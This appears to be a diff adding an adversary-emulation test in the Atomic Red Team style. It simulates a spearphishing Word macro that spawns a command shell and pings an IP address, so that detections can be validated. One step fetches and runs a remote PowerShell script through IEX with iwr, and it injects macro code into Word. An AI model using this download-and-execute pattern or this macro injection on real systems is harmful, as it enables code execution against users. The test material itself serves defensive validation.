@@ -1,0 +1,46 @@
+api_version: "2.0"
+name: Word spawned a command shell and used an IP address in the command line
+description: |
+    Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.
+    Upon execution, CMD will be launched and ping 8.8.8.8.
+args:
+    - name: jse_path
+      type: string
+      default: C:\Users\Public\art.jse
+    - name: ms_product
+      type: string
+      default: Word
+uuid: cbb6799a-425c-4f83-9194-5447a909d67f
+mitre:
+    tactics:
+        - 'TA0001: Initial Access'
+    techniques:
+        - 'T1566: Phishing'
+    subtechniques:
+        - 'T1566.001: Spearphishing Attachment'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Microsoft #{ms_product} must be installed
+      inline: |
+        try {
+          New-Object -COMObject "#{ms_product}.Application" | Out-Null
+          $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+          Stop-Process -Name $process
+          exit 0
+        } catch { {Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+        } }
+      executor: powershell
+    - name: word-spawned-a-command-shell-and-used-an-ip-address-in-the-command-line
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        $macrocode = "   Open `"{{.Args.jse_path}}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+        Invoke-MalDoc -macroCode $macrocode -officeProduct "{{.Args.ms_product}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item {{.Args.jse_path}} -ErrorAction Ignore
+        executor: powershell
